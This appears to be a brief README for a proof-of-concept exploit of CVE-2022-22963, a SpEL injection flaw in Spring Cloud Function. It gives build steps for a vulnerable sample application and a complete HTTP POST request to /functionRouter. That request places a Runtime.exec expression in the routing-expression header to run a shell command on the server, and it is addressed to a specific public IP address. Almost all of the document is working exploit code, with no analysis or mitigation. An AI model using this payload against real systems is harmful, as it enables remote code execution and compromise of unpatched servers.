# CVE-2022-22963

> Sring Cloud Function Spel Inject

## Build

> [hktalent/spring-spel-0day-poc: spring-cloud / spring-cloud-function,spring.cloud.function.routing-expression,RCE,0day,0-day,POC,EXP](https://github.com/hktalent/spring-spel-0day-poc)

```bash
wget https://github.com/spring-cloud/spring-cloud-function/archive/refs/tags/v3.2.3.zip
unzip v3.2.3.zip
cd spring-cloud-function-3.2.3
cd spring-cloud-function-samples/function-sample-pojo
mvn package
java -jar ./target/function-sample-pojo-2.0.0.RELEASE.jar
curl 127.0.0.1:8080
```

## Poc

```http
POST /functionRouter HTTP/1.1
Host: 47.98.109.141:48080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("touch /tmp/1")
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

123
```